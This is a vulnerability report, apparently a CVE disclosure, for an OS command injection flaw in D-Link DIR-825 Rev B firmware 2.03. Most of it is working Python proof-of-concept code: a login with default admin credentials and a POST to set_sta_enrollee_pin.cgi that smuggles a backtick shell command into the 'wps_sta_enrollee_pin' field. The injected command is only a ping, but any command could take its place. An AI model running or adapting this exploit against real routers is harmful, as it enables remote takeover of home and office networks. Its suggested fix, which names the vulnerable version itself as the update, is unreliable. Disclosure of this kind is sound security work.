

# CVE Report - Command Injection Vulnerability in DIR_825_REVB_FIRMWARE_2.03 Routers 

## Vulnerability Title

Command Injection Vulnerability in DIR_825_REVB_FIRMWARE_2.03 Router. 

## Vulnerability Description

DLINK DIR_825_REVB_FIRMWARE_2.03 devices have an OS command injection vulnerability
in the CGl interface "set_sta_enrollee_pin.cgi",which allows remote attackers to execute arbitrary
commands via parameter "wps_sta_enrollee_pin" passed to the "set_sta_enrollee_pin.cgi" binary
through a POST request.

## Reproduction Steps

1. Log in to the router.

```python
import requests

device_web_ip = '172.17.0.29'

headers = {

  'Host': device_web_ip,

  'Connection': 'keep-alive',

  'Content-Length': '1000',

  'Cache-Control': 'max-age=0',

  'Upgrade-Insecure-Requests': '1',

  'Origin': f'http://{device_web_ip}',

  'Content-Type': 'application/x-www-form-urlencoded',

  'Referer': f'http://{device_web_ip}',

  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',

  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

  'Accept-Encoding': 'gzip, deflate',

  'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'

}

login_params = login_params = {

  'html_response_page': 'logout_fail.asp',

  'login_name': 'YWRtaW4A',

  'login_n': 'admin',

  'login_pass': 'YWRtaW4A',

  'login': 'Log In'

}

login_url = 'http://{}/login.cgi'.format(device_web_ip)

r = requests.post(url=login_url, data=login_params, headers=headers, timeout=0.2)

if r is None or r.status_code != 200:

 print('Login wrong, please retry!')

 exit()

print(r.text)
```



2. Use the following Python code to test the vulnerability:

```py
#coding=gbk
import requests
import pickle 
import time

device_web_ip = "172.17.0.29"
base_url = "http://172.17.0.29/"

headers = {
    'Host': device_web_ip,
    'Connection': 'keep-alive',
    'Content-Length': '1000',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': f'http://{device_web_ip}',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': f'http://{device_web_ip}',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6'
}

target_para = {
    'wps_sta_enrollee_pin':'`ping -c 3 172.17.0.1`',
    'wlan0_enable':'1'
    }
r = requests.post(url=base_url+'set_sta_enrollee_pin.cgi', data=target_para, headers=headers)
print(r.text)
```



## Cause Analysis

The get_cgi function accepts external data and it enters system execution, resulting in a command execution vulnerability.

![image-20241229183621293](C:\Users\XiaoA\AppData\Roaming\Typora\typora-user-images\image-20241229183621293.png)



## Suggested Fix

It is recommended to update to the version of DIR_825_REVB_FIRMWARE_2.03 router to fix this vulnerability. 

